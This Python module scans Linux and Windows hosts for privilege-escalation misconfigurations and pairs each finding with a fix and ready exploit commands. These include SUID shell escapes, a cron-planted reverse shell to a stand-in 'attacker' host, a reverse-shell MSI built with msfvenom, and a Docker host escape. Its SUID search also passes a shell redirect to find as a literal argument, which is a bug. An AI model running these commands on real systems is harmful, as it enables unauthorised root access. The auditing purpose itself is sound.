"""
function_postex.engines.privilege_escalation
權限提升檢測引擎

檢測可用於權限提升的系統誤配置和漏洞。
"""

import os
import subprocess
import platform
from pathlib import Path
from typing import List, Dict, Any, Optional
from dataclasses import dataclass

from aiva_common.utils import get_logger
from aiva_common.enums.common import Severity, Confidence

logger = get_logger(__name__)


@dataclass
class PrivEscVector:
    """權限提升向量"""
    id: str
    severity: Severity
    confidence: Confidence
    title: str
    description: str
    evidence: Dict[str, Any]
    recommendation: str
    exploit_commands: List[str]
    category: str  # suid, sudo, kernel, cron, docker, etc.


class PrivilegeEscalationEngine:
    """權限提升檢測引擎"""
    
    def __init__(self, safe_mode: bool = False):
        """
        初始化權限提升檢測引擎
        
        Args:
            safe_mode: 安全模式（僅檢測，不執行）
        """
        self.safe_mode = safe_mode
        self.os_type = platform.system().lower()
        logger.info(f"權限提升引擎初始化 (OS: {self.os_type}, SafeMode: {safe_mode})")
    
    def scan(self, target: str = "localhost") -> List[PrivEscVector]:
        """
        執行權限提升掃描
        
        Args:
            target: 目標系統（默認 localhost）
        
        Returns:
            List[PrivEscVector]: 發現的權限提升向量列表
        """
        vectors = []
        
        if self.os_type == "linux":
            vectors.extend(self._check_linux_privesc())
        elif self.os_type == "windows":
            vectors.extend(self._check_windows_privesc())
        else:
            logger.warning(f"不支持的操作系統: {self.os_type}")
        
        logger.info(f"權限提升掃描完成，發現 {len(vectors)} 個向量")
        return vectors
    
    def _check_linux_privesc(self) -> List[PrivEscVector]:
        """Linux 權限提升檢查"""
        vectors = []
        
        # 1. SUID/SGID 檢查
        vectors.extend(self._check_suid_binaries())
        
        # 2. Sudo 配置檢查
        vectors.extend(self._check_sudo_config())
        
        # 3. 可寫路徑檢查
        vectors.extend(self._check_writable_paths())
        
        # 4. Cron Jobs 檢查
        vectors.extend(self._check_cron_jobs())
        
        # 5. Docker Socket 檢查
        vectors.extend(self._check_docker_socket())
        
        # 6. 內核版本漏洞
        vectors.extend(self._check_kernel_version())
        
        return vectors
    
    def _check_suid_binaries(self) -> List[PrivEscVector]:
        """檢查 SUID/SGID 二進制文件"""
        vectors = []
        
        try:
            # 查找 SUID 文件
            result = subprocess.run(
                ["find", "/", "-perm", "-4000", "-type", "f", "2>/dev/null"],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            suid_files = result.stdout.strip().split("\n")
            
            # 已知可利用的 SUID 二進制文件
            dangerous_suid = {
                "find": "find . -exec /bin/sh -p \\; -quit",
                "vim": "vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
                "nmap": "nmap --interactive",
                "perl": "perl -e 'exec \"/bin/sh\";'",
                "python": "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
                "ruby": "ruby -e 'exec \"/bin/sh\"'",
                "gdb": "gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit",
                "cp": "cp /bin/sh /tmp/sh && chmod +s /tmp/sh && /tmp/sh -p"
            }
            
            for suid_file in suid_files:
                if not suid_file:
                    continue
                
                binary_name = Path(suid_file).name
                
                if binary_name in dangerous_suid:
                    vectors.append(PrivEscVector(
                        id=f"PRIVESC-SUID-{binary_name.upper()}",
                        severity=Severity.HIGH,
                        confidence=Confidence.HIGH,
                        title=f"Dangerous SUID Binary: {binary_name}",
                        description=f"{suid_file} has SUID bit set and can be exploited for privilege escalation",
                        evidence={
                            "path": suid_file,
                            "binary": binary_name,
                            "permissions": "SUID"
                        },
                        recommendation=f"Remove SUID bit from {suid_file} or restrict access: chmod u-s {suid_file}",
                        exploit_commands=[dangerous_suid[binary_name]],
                        category="suid"
                    ))
        
        except subprocess.TimeoutExpired:
            logger.warning("SUID binary search timed out")
        except Exception as e:
            logger.error(f"Error checking SUID binaries: {e}")
        
        return vectors
    
    def _check_sudo_config(self) -> List[PrivEscVector]:
        """檢查 Sudo 配置"""
        vectors = []
        
        try:
            result = subprocess.run(
                ["sudo", "-l"],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            sudo_output = result.stdout
            
            # 檢查危險的 sudo 配置
            dangerous_patterns = {
                "NOPASSWD": "User can run sudo without password",
                "(ALL) ALL": "User has full sudo privileges",
                "/bin/sh": "User can run shell with sudo",
                "/bin/bash": "User can run bash with sudo",
                "vim": "User can edit files with sudo (shell escape possible)",
                "less": "User can view files with sudo (shell escape possible)",
                "more": "User can view files with sudo (shell escape possible)"
            }
            
            for pattern, description in dangerous_patterns.items():
                if pattern in sudo_output:
                    vectors.append(PrivEscVector(
                        id=f"PRIVESC-SUDO-{pattern.replace(' ', '_').upper()}",
                        severity=Severity.HIGH,
                        confidence=Confidence.HIGH,
                        title=f"Dangerous Sudo Configuration: {pattern}",
                        description=description,
                        evidence={
                            "sudo_config": sudo_output,
                            "pattern": pattern
                        },
                        recommendation="Review and restrict sudo privileges in /etc/sudoers",
                        exploit_commands=[
                            "sudo -i",
                            "sudo /bin/bash"
                        ],
                        category="sudo"
                    ))
        
        except subprocess.TimeoutExpired:
            logger.warning("Sudo check timed out")
        except Exception as e:
            logger.debug(f"Sudo check failed (may not have sudo): {e}")
        
        return vectors
    
    def _check_writable_paths(self) -> List[PrivEscVector]:
        """檢查可寫入的關鍵路徑"""
        vectors = []
        
        critical_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/sudoers",
            "/root/.ssh/authorized_keys"
        ]
        
        for path in critical_paths:
            if os.path.exists(path) and os.access(path, os.W_OK):
                vectors.append(PrivEscVector(
                    id=f"PRIVESC-WRITABLE-{Path(path).name.upper()}",
                    severity=Severity.CRITICAL,
                    confidence=Confidence.HIGH,
                    title=f"Critical File is Writable: {path}",
                    description=f"User has write access to {path}",
                    evidence={
                        "path": path,
                        "writable": True
                    },
                    recommendation=f"Fix permissions: chmod 644 {path}",
                    exploit_commands=[
                        f"# Add new user to {path}" if "passwd" in path else f"# Modify {path}"
                    ],
                    category="writable_files"
                ))
        
        return vectors
    
    def _check_cron_jobs(self) -> List[PrivEscVector]:
        """檢查 Cron Jobs 配置"""
        vectors = []
        
        cron_dirs = [
            "/etc/crontab",
            "/etc/cron.d",
            "/var/spool/cron/crontabs"
        ]
        
        for cron_path in cron_dirs:
            if os.path.exists(cron_path):
                if os.path.isfile(cron_path) and os.access(cron_path, os.W_OK):
                    vectors.append(PrivEscVector(
                        id="PRIVESC-CRON-WRITABLE",
                        severity=Severity.HIGH,
                        confidence=Confidence.HIGH,
                        title="Writable Cron Configuration",
                        description=f"Cron configuration {cron_path} is writable",
                        evidence={"path": cron_path},
                        recommendation="Fix cron permissions: chmod 644",
                        exploit_commands=[
                            "echo '* * * * * root /bin/bash -c \"/bin/bash -i >& /dev/tcp/attacker/4444 0>&1\"' >> " + cron_path
                        ],
                        category="cron"
                    ))
        
        return vectors
    
    def _check_docker_socket(self) -> List[PrivEscVector]:
        """檢查 Docker Socket 訪問"""
        vectors = []
        
        docker_socket = "/var/run/docker.sock"
        
        if os.path.exists(docker_socket) and os.access(docker_socket, os.R_OK | os.W_OK):
            vectors.append(PrivEscVector(
                id="PRIVESC-DOCKER-SOCKET",
                severity=Severity.CRITICAL,
                confidence=Confidence.HIGH,
                title="Docker Socket is Accessible",
                description="User has access to Docker socket, allowing container escape",
                evidence={
                    "socket_path": docker_socket,
                    "accessible": True
                },
                recommendation="Restrict Docker socket access to docker group only",
                exploit_commands=[
                    "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
                ],
                category="docker"
            ))
        
        return vectors
    
    def _check_kernel_version(self) -> List[PrivEscVector]:
        """檢查內核版本已知漏洞"""
        vectors = []
        
        try:
            kernel_version = platform.release()
            
            # 已知漏洞內核版本（示例）
            vulnerable_kernels = {
                "3.13.0": ["CVE-2016-5195 (DirtyCow)"],
                "4.4.0": ["CVE-2017-16995 (eBPF)"],
                "4.8.0": ["CVE-2017-1000112 (UFO)"]
            }
            
            for vuln_version, cves in vulnerable_kernels.items():
                if kernel_version.startswith(vuln_version):
                    vectors.append(PrivEscVector(
                        id=f"PRIVESC-KERNEL-{cves[0].replace('-', '_')}",
                        severity=Severity.HIGH,
                        confidence=Confidence.MEDIUM,
                        title=f"Vulnerable Kernel Version: {kernel_version}",
                        description=f"Kernel version may be vulnerable to: {', '.join(cves)}",
                        evidence={
                            "kernel_version": kernel_version,
                            "known_cves": cves
                        },
                        recommendation="Update kernel to latest stable version",
                        exploit_commands=[
                            "# Search exploit-db for kernel exploits"
                        ],
                        category="kernel"
                    ))
        
        except Exception as e:
            logger.error(f"Error checking kernel version: {e}")
        
        return vectors
    
    def _check_windows_privesc(self) -> List[PrivEscVector]:
        """Windows 權限提升檢查"""
        vectors = []

        # 1. Unquoted Service Paths
        vectors.extend(self._check_unquoted_service_paths())

        # 2. AlwaysInstallElevated
        vectors.extend(self._check_always_install_elevated())

        # 3. Writable Service Executables
        vectors.extend(self._check_writable_service_binaries())

        # 4. Scheduled Tasks with weak permissions
        vectors.extend(self._check_windows_scheduled_tasks())

        # 5. Token / Privilege checks
        vectors.extend(self._check_windows_token_privileges())

        return vectors

    def _check_unquoted_service_paths(self) -> List[PrivEscVector]:
        """檢查未加引號的服務路徑"""
        vectors = []
        try:
            result = subprocess.run(
                ["wmic", "service", "get", "name,displayname,pathname,startmode"],
                capture_output=True, text=True, timeout=30
            )
            for line in result.stdout.split("\n"):
                line = line.strip()
                if not line or "PathName" in line:
                    continue
                # Find paths with spaces that are not quoted
                parts = line.split()
                # Extract path portion (after service name columns)
                for i, part in enumerate(parts):
                    if "\\" in part and " " in line and '"' not in line:
                        # Check if the path has spaces and is unquoted
                        path_candidate = " ".join(parts[i:])
                        if " " in path_candidate and not path_candidate.startswith('"'):
                            vectors.append(PrivEscVector(
                                id=f"PRIVESC-WIN-UNQUOTED-{parts[0][:20].upper()}",
                                severity=Severity.HIGH,
                                confidence=Confidence.HIGH,
                                title=f"Unquoted Service Path: {parts[0]}",
                                description=f"Service has unquoted path with spaces, allowing DLL/binary hijacking",
                                evidence={"service": parts[0], "path": path_candidate},
                                recommendation="Quote the service binary path in the registry",
                                exploit_commands=[
                                    "# Place malicious executable in writable parent directory"
                                ],
                                category="unquoted_service"
                            ))
                            break
        except FileNotFoundError:
            logger.debug("wmic not available")
        except subprocess.TimeoutExpired:
            logger.warning("Unquoted service path check timed out")
        except Exception as e:
            logger.error(f"Error checking unquoted service paths: {e}")
        return vectors

    def _check_always_install_elevated(self) -> List[PrivEscVector]:
        """檢查 AlwaysInstallElevated 設定"""
        vectors = []
        try:
            reg_paths = [
                r"HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer",
                r"HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer",
            ]
            for reg_path in reg_paths:
                result = subprocess.run(
                    ["reg", "query", reg_path, "/v", "AlwaysInstallElevated"],
                    capture_output=True, text=True, timeout=10
                )
                if "0x1" in result.stdout:
                    hive = "HKLM" if "HKLM" in reg_path else "HKCU"
                    vectors.append(PrivEscVector(
                        id=f"PRIVESC-WIN-ALWAYSINSTALL-{hive}",
                        severity=Severity.CRITICAL,
                        confidence=Confidence.HIGH,
                        title=f"AlwaysInstallElevated Enabled ({hive})",
                        description="Windows Installer always runs with elevated privileges, any user can install malicious MSI",
                        evidence={"registry_path": reg_path, "value": "0x1"},
                        recommendation="Disable AlwaysInstallElevated in Group Policy",
                        exploit_commands=[
                            "msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi -o evil.msi",
                            "msiexec /quiet /qn /i evil.msi"
                        ],
                        category="always_install_elevated"
                    ))
        except FileNotFoundError:
            logger.debug("reg command not available")
        except Exception as e:
            logger.error(f"Error checking AlwaysInstallElevated: {e}")
        return vectors

    def _check_writable_service_binaries(self) -> List[PrivEscVector]:
        """檢查可寫入的服務執行檔"""
        vectors = []
        try:
            result = subprocess.run(
                ["wmic", "service", "get", "name,pathname", "/format:csv"],
                capture_output=True, text=True, timeout=30
            )
            for line in result.stdout.split("\n"):
                parts = line.strip().split(",")
                if len(parts) < 3:
                    continue
                service_name = parts[1]
                service_path = parts[2].strip('"').split(" ")[0] if len(parts) > 2 else ""
                if not service_path or not os.path.exists(service_path):
                    continue
                if os.access(service_path, os.W_OK):
                    vectors.append(PrivEscVector(
                        id=f"PRIVESC-WIN-WRITABLE-SVC-{service_name[:20].upper()}",
                        severity=Severity.CRITICAL,
                        confidence=Confidence.HIGH,
                        title=f"Writable Service Binary: {service_name}",
                        description=f"Service binary {service_path} is writable, can be replaced with malicious executable",
                        evidence={"service": service_name, "path": service_path},
                        recommendation=f"Restrict write access to {service_path}",
                        exploit_commands=[
                            f"# Replace {service_path} with malicious binary",
                            f"sc stop {service_name}",
                            f"sc start {service_name}"
                        ],
                        category="writable_service"
                    ))
        except FileNotFoundError:
            logger.debug("wmic not available")
        except Exception as e:
            logger.error(f"Error checking writable service binaries: {e}")
        return vectors

    def _check_windows_scheduled_tasks(self) -> List[PrivEscVector]:
        """檢查可利用的排程工作"""
        vectors = []
        try:
            result = subprocess.run(
                ["schtasks", "/query", "/fo", "CSV", "/v"],
                capture_output=True, text=True, timeout=30
            )
            for line in result.stdout.split("\n"):
                parts = line.strip().split(",")
                if len(parts) < 9:
                    continue
                task_name = parts[1].strip('"')
                task_path = parts[8].strip('"') if len(parts) > 8 else ""
                run_as = parts[7].strip('"') if len(parts) > 7 else ""

                if not task_path or task_path == "Task To Run":
                    continue

                # Check if task runs as SYSTEM and binary is writable
                binary = task_path.split(" ")[0].strip('"')
                if ("SYSTEM" in run_as or "Administrator" in run_as) and os.path.exists(binary) and os.access(binary, os.W_OK):
                    vectors.append(PrivEscVector(
                        id=f"PRIVESC-WIN-SCHTASK-{task_name[:20].upper().replace(' ', '_')}",
                        severity=Severity.HIGH,
                        confidence=Confidence.HIGH,
                        title=f"Writable Scheduled Task Binary: {task_name}",
                        description=f"Scheduled task runs as {run_as} with writable binary {binary}",
                        evidence={"task": task_name, "binary": binary, "run_as": run_as},
                        recommendation="Restrict write access to scheduled task binaries",
                        exploit_commands=[
                            f"# Replace {binary} with malicious binary"
                        ],
                        category="scheduled_task"
                    ))
        except FileNotFoundError:
            logger.debug("schtasks not available")
        except subprocess.TimeoutExpired:
            logger.warning("Scheduled tasks check timed out")
        except Exception as e:
            logger.error(f"Error checking scheduled tasks: {e}")
        return vectors

    def _check_windows_token_privileges(self) -> List[PrivEscVector]:
        """檢查當前使用者的 Token 權限"""
        vectors = []
        try:
            result = subprocess.run(
                ["whoami", "/priv"],
                capture_output=True, text=True, timeout=10
            )

            dangerous_privs = {
                "SeImpersonatePrivilege": ("Token Impersonation", "Potato-family attacks (JuicyPotato, PrintSpoofer)"),
                "SeAssignPrimaryTokenPrivilege": ("Assign Primary Token", "Create process with elevated token"),
                "SeDebugPrivilege": ("Debug Privilege", "Inject into privileged processes"),
                "SeBackupPrivilege": ("Backup Privilege", "Read any file on the system"),
                "SeRestorePrivilege": ("Restore Privilege", "Write to any file on the system"),
                "SeTakeOwnershipPrivilege": ("Take Ownership", "Take ownership of any securable object"),
                "SeLoadDriverPrivilege": ("Load Driver", "Load kernel-mode drivers"),
            }

            for priv_name, (title, desc) in dangerous_privs.items():
                if priv_name in result.stdout and "Enabled" in result.stdout.split(priv_name)[1].split("\n")[0]:
                    vectors.append(PrivEscVector(
                        id=f"PRIVESC-WIN-TOKEN-{priv_name.upper()}",
                        severity=Severity.CRITICAL if priv_name in ("SeImpersonatePrivilege", "SeDebugPrivilege") else Severity.HIGH,
                        confidence=Confidence.HIGH,
                        title=f"Dangerous Token Privilege: {title}",
                        description=f"{priv_name} is enabled - {desc}",
                        evidence={"privilege": priv_name, "status": "Enabled"},
                        recommendation=f"Remove {priv_name} from user/service account unless absolutely required",
                        exploit_commands=[
                            f"# Exploit {priv_name} for privilege escalation"
                        ],
                        category="token_privilege"
                    ))
        except FileNotFoundError:
            logger.debug("whoami not available")
        except Exception as e:
            logger.error(f"Error checking token privileges: {e}")
        return vectors
